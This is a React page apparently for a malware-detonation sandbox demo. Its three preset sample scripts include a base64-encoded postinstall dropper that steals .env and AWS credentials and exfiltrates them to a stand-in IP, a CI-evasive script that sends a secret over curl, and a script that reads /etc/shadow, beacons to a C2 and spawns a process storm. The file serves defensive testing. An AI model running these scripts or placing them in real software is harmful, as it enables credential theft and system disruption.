"use client";

import React, { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  ShieldAlert,
  ShieldCheck,
  Play,
  Terminal,
  Lock,
  Cpu,
  CheckCircle2,
  AlertTriangle,
  FileCode,
  Activity,
  Server,
  Zap,
  Copy,
  Check,
  Radio,
  Layers,
  Sparkles,
  Eye,
  Flame,
  RefreshCw,
} from "lucide-react";

const PRESETS = [
  {
    id: "preset1",
    badge: "SUPPLY-CHAIN DROPPER",
    risk: "CRITICAL",
    title: "Obfuscated npm Postinstall Hook",
    subtitle: "Base64 stage-2 payload -> Hunts .env & AWS credentials -> C2 POST exfiltration",
    description:
      "Simulates a compromised npm package lifecycle script that decodes a hidden Base64 dropper, scrapes /workspace/.env and ~/.aws/credentials, and attempts to exfiltrate secrets to 198.51.100.42:443.",
    code: `#!/bin/bash
echo "[npm-postinstall] Initializing native addon build..."
# Base64 encoded dropper: reads /workspace/.env and ~/.aws/credentials, then curls C2 server
PAYLOAD="ZWNobyAiW1N0YWdlLTJdIEh1bnRpbmcgZm9yIGNsb3VkIGNyZWRlbnRpYWxzLi4uIgpjYXQgL3dvcmtzcGFjZS8uZW52ID4gL3RtcC9zdG9sZW4udHh0IDJ+L2Rldi9udWxsCmNhdCAvd29ya3NwYWNlLy5hd3MvY3JlZGVudGlhbHMgPj4gL3RtcC9zdG9sZW4udHh0IDJ+L2Rldi9udWxsCmN1cmwgLXMgLVggUE9TVCBodHRwOi8vMTk4LjUxLjEwMC40Mjo0NDMvY29sbGVjdCAtZCBAL3RtcC9zdG9sZW4udHh0IHx8IHRydWU="
echo "$PAYLOAD" | base64 -d > /tmp/stage2.sh
chmod +x /tmp/stage2.sh
/bin/bash /tmp/stage2.sh
echo "[npm-postinstall] Build hook completed."`,
  },
  {
    id: "preset2",
    badge: "ADAPTIVE 2-PASS RETRY",
    risk: "EVASIVE",
    title: "Evasive CI/CD Poisoned Workflow",
    subtitle: "Dormant on Pass 1 ($CI check) -> Agent spoofs CI=true on Pass 2 to force detonation",
    description:
      "Demonstrates multi-step agentic self-correction: Pass 1 exits cleanly because the malware checks if it is inside GitHub Actions ($CI == true). The Vultr Agent detects the evasion, injects spoofed CI runner env vars, and triggers Pass 2 automatically.",
    code: `#!/bin/bash
echo "[ci-step] Inspecting build runner telemetry..."
if [ "$CI" != "true" ]; then
    echo "[ci-step] Sandbox/local environment detected ($CI != true). Exiting cleanly to evade analysis."
    exit 0
fi
echo "[MALICIOUS-TRIGGER] Production CI Runner confirmed! Extracting pipeline secrets..."
cat /workspace/.env
curl -m 2 -s "http://203.0.113.99:8080/exfil?secret=$(head -n 1 /workspace/.env)" || true
touch /tmp/ci_runner_backdoor`,
  },
  {
    id: "preset3",
    badge: "CONTAINMENT MOMENT",
    risk: "EXTREME",
    title: "Kernel Escape, Shadow Theft & Fork Storm",
    subtitle: "Tests read-only rootfs, /etc/shadow access, C2 socket block, and 40-PID process bomb",
    description:
      "Attempts to inspect kernel dmesg, write to read-only /etc, dump /etc/shadow, open an outbound C2 socket, and spawn a process storm neutralized by --pids-limit 32.",
    code: `#!/bin/bash
echo "=== [1] Kernel & User-Space Boundary Check ==="
dmesg | head -n 3 || true

echo "=== [2] Attempting Host Root Modification (--read-only) ==="
touch /etc/malicious_cron 2>&1 || true

echo "=== [3] Attempting Shadow Password Theft ==="
cat /etc/shadow 2>&1 || true

echo "=== [4] Attempting External C2 Exfiltration (--network none) ==="
curl -m 2 http://198.51.100.250/c2_beacon 2>&1 || true

echo "=== [5] Launching Process Storm (Capped at --pids-limit 32) ==="
for i in $(seq 1 40); do
    sleep 2 &
done
wait`,
  },
];

const EXECUTION_STEPS = [
  "Connecting to Vultr Serverless Inference API...",
  "Synthesizing dynamic honey-token canary traps (.env & AWS keys)...",
  "Booting ephemeral gVisor (runsc) user-space kernel container...",
  "Attaching strace syscall interceptor (execve, openat, connect)...",
  "Analyzing Pass 1 behavioral telemetry for sandbox evasion...",
  "Purging container volume & compiling YARA mitigation rule...",
];

export default function DetonateProMaxPage() {
  const [selectedPreset, setSelectedPreset] = useState(PRESETS[0]);
  const [code, setCode] = useState(PRESETS[0].code);
  const [apiKey, setApiKey] = useState("");
  const [baseUrl, setBaseUrl] = useState("https://api.vultrinference.com/v1");
  const [model, setModel] = useState("deepseek-r1-distill-qwen-32b");
  const [useGvisor, setUseGvisor] = useState(true);
  const [loading, setLoading] = useState(false);
  const [loadingStep, setLoadingStep] = useState(0);
  const [result, setResult] = useState<any>(null);
  const [activeTab, setActiveTab] = useState<"iocs" | "report" | "telemetry" | "strace">("iocs");
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    if (!loading) {
      setLoadingStep(0);
      return;
    }
    const interval = setInterval(() => {
      setLoadingStep((prev) => (prev < EXECUTION_STEPS.length - 1 ? prev + 1 : prev));
    }, 950);
    return () => clearInterval(interval);
  }, [loading]);

  const handleSelectPreset = (preset: (typeof PRESETS)[0]) => {
    setSelectedPreset(preset);
    setCode(preset.code);
  };

  const runDetonation = async () => {
    setLoading(true);
    setResult(null);
    try {
      const res = await fetch("/api/detonate", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ code, apiKey, baseUrl, model, useGvisor }),
      });
      const data = await res.json();
      setResult(data);
    } catch (err) {
      console.error(err);
    } finally {
      setLoading(false);
    }
  };

  const copyText = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="min-h-screen bg-[#050811] text-slate-100 selection:bg-rose-500/30 selection:text-rose-200 relative overflow-x-hidden">
      {/* Ambient Cyber Mesh Background */}
      <div className="pointer-events-none fixed inset-0 z-0">
        <div className="absolute -top-40 left-1/4 w-[600px] h-[600px] bg-rose-600/10 rounded-full blur-[150px]" />
        <div className="absolute top-1/3 -right-40 w-[550px] h-[550px] bg-cyan-500/10 rounded-full blur-[150px]" />
        <div
          className="absolute inset-0 opacity-[0.04]"
          style={{
            backgroundImage:
              "linear-gradient(to right, #94a3b8 1px, transparent 1px), linear-gradient(to bottom, #94a3b8 1px, transparent 1px)",
            backgroundSize: "36px 36px",
          }}
        />
      </div>

      {/* Top Glassmorphic Command Header */}
      <header className="sticky top-0 z-30 border-b border-white/[0.08] bg-[#050811]/80 backdrop-blur-xl">
        <div className="max-w-[1440px] mx-auto px-6 py-4 flex flex-wrap items-center justify-between gap-4">
          <div className="flex items-center gap-4">
            <motion.div
              initial={{ scale: 0.85, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              transition={{ type: "spring", stiffness: 250, damping: 20 }}
              className="relative flex items-center justify-center w-12 h-12 rounded-2xl bg-gradient-to-br from-rose-500/20 via-orange-500/10 to-transparent border border-rose-500/40 shadow-lg shadow-rose-500/10"
            >
              <Flame className="w-6 h-6 text-rose-400" />
              <span className="absolute -top-1 -right-1 flex h-3 w-3">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75" />
                <span className="relative inline-flex rounded-full h-3 w-3 bg-emerald-500" />
              </span>
            </motion.div>

            <div>
              <div className="flex items-center gap-3">
                <h1 className="text-2xl font-black tracking-tight bg-gradient-to-r from-white via-slate-100 to-slate-400 bg-clip-text text-transparent">
                  DETONATE
                </h1>
              </div>
            </div>

          </div>

        </div>
      </header>

      {/* Main Bento Grid Layout */}
      <main className="relative z-10 max-w-[1440px] mx-auto px-6 py-8 grid grid-cols-1 lg:grid-cols-12 gap-7">
        {/* RIGHT COLUMN: THREAT PRESETS, CODE CHAMBER & TELEMETRY */}
        <motion.section
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.45, delay: 0.05 }}
          className="lg:col-span-12 space-y-6"
        >
          {/* Threat Scenario Selector */}
          <div className="rounded-3xl bg-slate-900/60 border border-white/[0.08] backdrop-blur-xl p-6 shadow-2xl space-y-5">
            <div className="flex flex-wrap items-center justify-between gap-2">
              <div>
                <h2 className="text-sm font-bold uppercase tracking-wider text-white flex items-center gap-2">
                  <Layers className="w-4 h-4 text-rose-400" />
                  Select Threat Vector or Paste Untrusted Artifact
                </h2>
                <p className="text-xs text-slate-400 mt-0.5">
                  Click any preset below to load a payload
                </p>
              </div>
            </div>

            {/* 3 Animated Preset Cards */}
            <div className="grid grid-cols-1 md:grid-cols-3 gap-3.5">
              {PRESETS.map((p) => {
                const active = selectedPreset.id === p.id;
                return (
                  <motion.button
                    key={p.id}
                    type="button"
                    whileHover={{ y: -3 }}
                    whileTap={{ scale: 0.98 }}
                    onClick={() => handleSelectPreset(p)}
                    className={`relative text-left p-4 rounded-2xl border transition-all min-h-[124px] flex flex-col justify-between focus-visible:ring-2 focus-visible:ring-rose-400 ${
                      active
                        ? "bg-gradient-to-b from-rose-500/15 via-slate-900 to-slate-950 border-rose-500/60 shadow-xl shadow-rose-500/10"
                        : "bg-slate-950/70 border-white/[0.07] hover:border-white/20"
                    }`}
                  >
                    <div className="flex items-center justify-between gap-2 mb-2">
                      <span
                        className={`text-[10px] font-mono font-bold px-2 py-0.5 rounded-md ${
                          active
                            ? "bg-rose-500/20 text-rose-300 border border-rose-500/40"
                            : "bg-white/[0.05] text-slate-400"
                        }`}
                      >
                        {p.badge}
                      </span>
                      {active && (
                        <span className="w-2 h-2 rounded-full bg-rose-400 animate-ping" />
                      )}
                    </div>
                    <div>
                      <div className="text-sm font-bold text-white leading-snug">
                        {p.title}
                      </div>
                      <div className="text-[11px] text-slate-400 mt-1 line-clamp-2">
                        {p.subtitle}
                      </div>
                    </div>
                  </motion.button>
                );
              })}
            </div>

            {/* Scenario Context Banner */}
            <div className="p-4 rounded-2xl bg-slate-950/90 border border-white/[0.07] flex items-start gap-3 text-xs text-slate-300">
              <Eye className="w-4 h-4 text-cyan-400 shrink-0 mt-0.5" />
              <div>
                <strong className="text-white">Expected Agent Behavior: </strong>
                {selectedPreset.description}
              </div>
            </div>

            {/* Mac-Style Terminal Code Editor */}
            <div className="rounded-2xl overflow-hidden border border-white/[0.1] bg-[#03050a] shadow-inner">
              <div className="px-4 py-2.5 bg-slate-900/90 border-b border-white/[0.07] flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <span className="w-3 h-3 rounded-full bg-rose-500/80" />
                  <span className="w-3 h-3 rounded-full bg-amber-500/80" />
                  <span className="w-3 h-3 rounded-full bg-emerald-500/80" />
                  <span className="ml-2 text-xs font-mono text-slate-400">
                    payload.sh — Isolated Detonation Target
                  </span>
                </div>
                <span className="text-[11px] font-mono text-slate-400">
                  strace: execve, openat, connect, unlink
                </span>
              </div>
              <textarea
                aria-label="Untrusted Payload Script Editor"
                value={code}
                onChange={(e) => setCode(e.target.value)}
                rows={8}
                className="w-full p-4 bg-transparent font-mono text-xs text-emerald-300 focus:outline-none leading-relaxed resize-y"
              />
            </div>

            {/* Primary Detonate CTA Button (Min 52px Touch Target) */}
            <motion.button
              type="button"
              whileHover={{ scale: 1.01 }}
              whileTap={{ scale: 0.99 }}
              onClick={runDetonation}
              disabled={loading}
              className="w-full min-h-[54px] py-4 px-6 rounded-2xl font-bold text-sm tracking-wide bg-gradient-to-r from-rose-600 via-red-600 to-orange-600 hover:from-rose-500 hover:to-orange-500 text-white shadow-xl shadow-rose-600/25 flex items-center justify-center gap-3 disabled:opacity-60 transition-all cursor-pointer focus-visible:ring-2 focus-visible:ring-rose-400"
            >
              {loading ? (
                <>
                  <RefreshCw className="w-5 h-5 animate-spin" />
                  <span>{EXECUTION_STEPS[loadingStep]}</span>
                </>
              ) : (
                <>
                  <Play className="w-5 h-5 fill-current" />
                  <span>DETONATE IN EPHEMERAL GVISOR SANDBOX</span>
                </>
              )}
            </motion.button>
          </div>

          {/* Live Animated Radar Loader During Execution */}
          <AnimatePresence>
            {loading && (
              <motion.div
                initial={{ opacity: 0, height: 0 }}
                animate={{ opacity: 1, height: "auto" }}
                exit={{ opacity: 0, height: 0 }}
                className="rounded-3xl bg-slate-900/80 border border-rose-500/30 backdrop-blur-xl p-6 space-y-4"
              >
                <div className="flex items-center justify-between text-xs">
                  <span className="font-mono text-rose-300 flex items-center gap-2">
                    <span className="w-2.5 h-2.5 rounded-full bg-rose-500 animate-ping" />
                    SANDBOX EXECUTION IN PROGRESS
                  </span>
                  <span className="font-mono text-slate-400">
                    Step {loadingStep + 1} of {EXECUTION_STEPS.length}
                  </span>
                </div>
                <div className="w-full h-2 rounded-full bg-slate-950 overflow-hidden">
                  <motion.div
                    className="h-full bg-gradient-to-r from-rose-500 via-amber-400 to-emerald-400"
                    initial={{ width: "10%" }}
                    animate={{
                      width: `${((loadingStep + 1) / EXECUTION_STEPS.length) * 100}%`,
                    }}
                    transition={{ duration: 0.4 }}
                  />
                </div>
                <div className="grid grid-cols-2 md:grid-cols-3 gap-2 pt-1">
                  {EXECUTION_STEPS.map((step, i) => (
                    <div
                      key={i}
                      className={`text-[11px] font-mono p-2.5 rounded-xl border ${
                        i <= loadingStep
                          ? "bg-emerald-500/10 border-emerald-500/30 text-emerald-300"
                          : "bg-slate-950/50 border-white/[0.05] text-slate-500"
                      }`}
                    >
                      {step}
                    </div>
                  ))}
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {/* RESULTS & TELEMETRY SUITE */}
          <AnimatePresence>
            {result && (
              <motion.div
                initial={{ opacity: 0, y: 24 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ type: "spring", stiffness: 220, damping: 24 }}
                className="space-y-6"
              >
                {/* 4-Stage Multi-Step Agentic Loop Visualizer */}
                <div className="rounded-3xl bg-slate-900/60 border border-white/[0.08] backdrop-blur-xl p-6">
                  <h3 className="text-xs font-bold uppercase tracking-widest text-slate-400 mb-4">
                    Verified 4-Stage Autonomous Agent Workflow
                  </h3>
                  <div className="grid grid-cols-1 md:grid-cols-4 gap-3.5 text-xs">
                    {[
                      {
                        step: "01",
                        title: "Canary Honeypot",
                        desc: "Vultr LLM planted decoy .env & AWS credentials inside /workspace.",
                        color: "emerald",
                      },
                      {
                        step: "02",
                        title: "Pass 1 Detonation",
                        desc: `Ran in ${result.pass1?.elapsed}s (Exit ${result.pass1?.returncode}) under strace audit.`,
                        color: "emerald",
                      },
                      {
                        step: "03",
                        title: "Adaptive De-Evasion",
                        desc: result.evasionDetected
                          ? "Evasion caught! Agent injected CI=true and re-detonated Pass 2."
                          : "Full behavioral tree captured on Pass 1.",
                        color: result.evasionDetected ? "amber" : "emerald",
                      },
                      {
                        step: "04",
                        title: "Lifecycle Purge",
                        desc: "Container & tmpfs volume destroyed; YARA rule synthesized.",
                        color: "emerald",
                      },
                    ].map((st, idx) => (
                      <motion.div
                        key={idx}
                        initial={{ opacity: 0, y: 12 }}
                        animate={{ opacity: 1, y: 0 }}
                        transition={{ delay: idx * 0.08 }}
                        className={`p-4 rounded-2xl bg-slate-950/90 border ${
                          st.color === "amber"
                            ? "border-amber-500/50 shadow-lg shadow-amber-500/5"
                            : "border-emerald-500/30"
                        }`}
                      >
                        <div className="flex items-center justify-between mb-1.5">
                          <span className="font-mono text-[10px] px-2 py-0.5 rounded bg-white/[0.06] text-slate-300">
                            STAGE {st.step}
                          </span>
                          {st.color === "amber" ? (
                            <AlertTriangle className="w-4 h-4 text-amber-400" />
                          ) : (
                            <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                          )}
                        </div>
                        <div className="font-bold text-white text-sm">{st.title}</div>
                        <p className="text-slate-400 text-[11px] mt-1 leading-relaxed">
                          {st.desc}
                        </p>
                      </motion.div>
                    ))}
                  </div>
                </div>

                {/* BLAST RADIUS: ZERO SCORECARD */}
                <div className="rounded-3xl bg-gradient-to-br from-emerald-950/40 via-slate-900/80 to-slate-950 border border-emerald-500/40 backdrop-blur-xl p-6 shadow-2xl">
                  <div className="flex flex-wrap items-center justify-between gap-2 mb-5">
                    <div className="flex items-center gap-2.5">
                      <ShieldCheck className="w-6 h-6 text-emerald-400" />
                      <div>
                        <h3 className="text-base font-black tracking-tight text-white">
                          BLAST RADIUS: ZERO — CONTAINMENT SCORECARD
                        </h3>
                        <p className="text-xs text-slate-400">
                          Real-time hardware and kernel boundary verification
                        </p>
                      </div>
                    </div>
                    <span className="text-xs font-mono font-bold px-3 py-1 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/40">
                      HOST VM INTEGRITY: 100% UNTOUCHED
                    </span>
                  </div>

                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                    <div className="p-4 rounded-2xl bg-slate-950/90 border border-white/[0.07]">
                      <div className="text-xs text-slate-400">Kernel Isolation</div>
                      <div className="text-xl font-black text-emerald-400 mt-1 font-mono">
                        {result.gvisorUsed ? "gVisor (runsc)" : "Isolated runc"}
                      </div>
                      <div className="text-[11px] text-slate-400 mt-1">
                        User-space syscall sentry
                      </div>
                    </div>

                    <div className="p-4 rounded-2xl bg-slate-950/90 border border-white/[0.07]">
                      <div className="text-xs text-slate-400">Data Exfiltration</div>
                      <div className="text-xl font-black text-emerald-400 mt-1 font-mono">
                        0 Bytes
                      </div>
                      <div className="text-[11px] text-rose-400 font-semibold mt-1">
                        {result.metrics?.blockedNet || 0} C2 Socket(s) Blocked
                      </div>
                    </div>

                    <div className="p-4 rounded-2xl bg-slate-950/90 border border-white/[0.07]">
                      <div className="text-xs text-slate-400">Host Secrets Exposed</div>
                      <div className="text-xl font-black text-emerald-400 mt-1 font-mono">
                        0 Keys
                      </div>
                      <div className="text-[11px] text-amber-300 font-semibold mt-1">
                        {result.metrics?.canaryHits || 0} Decoy Canaries Tripped
                      </div>
                    </div>

                    <div className="p-4 rounded-2xl bg-slate-950/90 border border-white/[0.07]">
                      <div className="text-xs text-slate-400">Container Lifecycle</div>
                      <div className="text-xl font-black text-cyan-300 mt-1 font-mono">
                        DESTROYED
                      </div>
                      <div className="text-[11px] text-slate-400 mt-1">
                        Wiped in {result.metrics?.elapsed}s
                      </div>
                    </div>
                  </div>
                </div>

                {/* Interactive Animated Tabs for Deep SOC Artifacts */}
                <div className="rounded-3xl bg-slate-900/60 border border-white/[0.08] backdrop-blur-xl overflow-hidden shadow-2xl">
                  <div className="flex flex-wrap border-b border-white/[0.08] bg-slate-950/60 p-2 gap-2">
                    {[
                      {
                        id: "iocs",
                        label: `Extracted IOCs (${result.iocs?.length || 0})`,
                        icon: Activity,
                      },
                      {
                        id: "report",
                        label: "Vultr LLM Verdict & YARA Rule",
                        icon: FileCode,
                      },
                      {
                        id: "telemetry",
                        label: "Pass 1 / Pass 2 Sandbox Stdout",
                        icon: Terminal,
                      },
                      {
                        id: "strace",
                        label: "Raw Kernel Syscalls (strace)",
                        icon: Cpu,
                      },
                    ].map((tab) => {
                      const Icon = tab.icon;
                      const isActive = activeTab === tab.id;
                      return (
                        <button
                          key={tab.id}
                          type="button"
                          onClick={() => setActiveTab(tab.id as any)}
                          className={`relative min-h-[44px] px-4 py-2.5 rounded-xl text-xs font-bold flex items-center gap-2 transition-colors ${
                            isActive
                              ? "text-white"
                              : "text-slate-400 hover:text-slate-200"
                          }`}
                        >
                          {isActive && (
                            <motion.div
                              layoutId="activeTabPill"
                              transition={{
                                type: "spring",
                                stiffness: 380,
                                damping: 30,
                              }}
                              className="absolute inset-0 rounded-xl bg-gradient-to-r from-rose-500/20 to-orange-500/20 border border-rose-500/40"
                            />
                          )}
                          <Icon className="w-4 h-4 relative z-10 text-rose-400" />
                          <span className="relative z-10">{tab.label}</span>
                        </button>
                      );
                    })}
                  </div>

                  <div className="p-6">
                    {activeTab === "iocs" && (
                      <div>
                        {result.iocs?.length > 0 ? (
                          <div className="overflow-x-auto">
                            <table className="w-full text-left border-collapse text-xs">
                              <thead>
                                <tr className="border-b border-white/[0.08] text-slate-400 uppercase tracking-wider text-[11px]">
                                  <th className="py-3 px-4">Threat Category</th>
                                  <th className="py-3 px-4">Verifiable Indicator</th>
                                  <th className="py-3 px-4">Intercepted Syscall</th>
                                  <th className="py-3 px-4">Severity</th>
                                </tr>
                              </thead>
                              <tbody className="divide-y divide-white/[0.06] font-mono">
                                {result.iocs.map((ioc: any, idx: number) => (
                                  <tr
                                    key={idx}
                                    className="hover:bg-white/[0.02] transition-colors"
                                  >
                                    <td className="py-3.5 px-4 text-slate-200 font-semibold">
                                      {ioc.category}
                                    </td>
                                    <td className="py-3.5 px-4 text-amber-300">
                                      {ioc.indicator}
                                    </td>
                                    <td className="py-3.5 px-4 text-cyan-300">
                                      {ioc.syscall}
                                    </td>
                                    <td className="py-3.5 px-4">
                                      <span
                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold ${
                                          ioc.severity === "CRITICAL"
                                            ? "bg-rose-500/20 text-rose-300 border border-rose-500/40"
                                            : "bg-amber-500/20 text-amber-300 border border-amber-500/40"
                                        }`}
                                      >
                                        {ioc.severity}
                                      </span>
                                    </td>
                                  </tr>
                                ))}
                              </tbody>
                            </table>
                          </div>
                        ) : (
                          <p className="text-xs text-slate-400">
                            No suspicious file or network syscalls recorded during execution.
                          </p>
                        )}
                      </div>
                    )}

                    {activeTab === "report" && (
                      <div className="space-y-3">
                        <div className="flex justify-end">
                          <button
                            type="button"
                            onClick={() => copyText(result.report || "")}
                            className="min-h-[40px] px-3.5 py-1.5 rounded-xl bg-white/[0.05] hover:bg-white/[0.1] border border-white/[0.1] text-xs font-medium text-slate-200 flex items-center gap-2"
                          >
                            {copied ? (
                              <>
                                <Check className="w-4 h-4 text-emerald-400" />
                                Copied to Clipboard
                              </>
                            ) : (
                              <>
                                <Copy className="w-4 h-4 text-slate-400" />
                                Copy Report & YARA Rule
                              </>
                            )}
                          </button>
                        </div>
                        <pre className="whitespace-pre-wrap font-mono text-xs text-slate-200 bg-slate-950/90 p-5 rounded-2xl border border-white/[0.08] leading-relaxed">
                          {result.report}
                        </pre>
                      </div>
                    )}

                    {activeTab === "telemetry" && (
                      <div className="space-y-4 text-xs font-mono">
                        <div>
                          <div className="text-slate-400 mb-1.5">
                            1. Agent-Synthesized Honey-Token Setup (setup_canaries.sh):
                          </div>
                          <pre className="p-4 rounded-2xl bg-slate-950 border border-white/[0.08] text-emerald-300 overflow-x-auto">
                            {result.canaryScript}
                          </pre>
                        </div>
                        <div>
                          <div className="text-slate-400 mb-1.5">
                            2. Isolated Container Execution Command:
                          </div>
                          <pre className="p-4 rounded-2xl bg-slate-950 border border-white/[0.08] text-cyan-300 overflow-x-auto whitespace-pre-wrap">
                            {result.finalRun?.command}
                          </pre>
                        </div>
                        <div>
                          <div className="text-slate-400 mb-1.5">
                            3. Pass 1 Standard Output:
                          </div>
                          <pre className="p-4 rounded-2xl bg-slate-950 border border-white/[0.08] text-slate-200 overflow-x-auto whitespace-pre-wrap">
                            {result.pass1?.stdout || "(no stdout)"}
                            {result.pass1?.stderr ? `\n${result.pass1.stderr}` : ""}
                          </pre>
                        </div>
                        {result.pass2 && (
                          <div>
                            <div className="text-amber-400 font-bold mb-1.5">
                              4. Pass 2 Adaptive Evasion Bypass Output (CI=true Injected):
                            </div>
                            <pre className="p-4 rounded-2xl bg-slate-950 border border-amber-500/40 text-amber-200 overflow-x-auto whitespace-pre-wrap">
                              {result.pass2.stdout || "(no stdout)"}
                              {result.pass2.stderr ? `\n${result.pass2.stderr}` : ""}
                            </pre>
                          </div>
                        )}
                      </div>
                    )}

                    {activeTab === "strace" && (
                      <pre className="p-5 rounded-2xl bg-slate-950 border border-white/[0.08] font-mono text-[11px] text-emerald-300/90 overflow-x-auto leading-relaxed">
                        {result.finalRun?.syscallsPreview || "No syscall log captured."}
                      </pre>
                    )}
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </motion.section>
      </main>
    </div>
  );
}
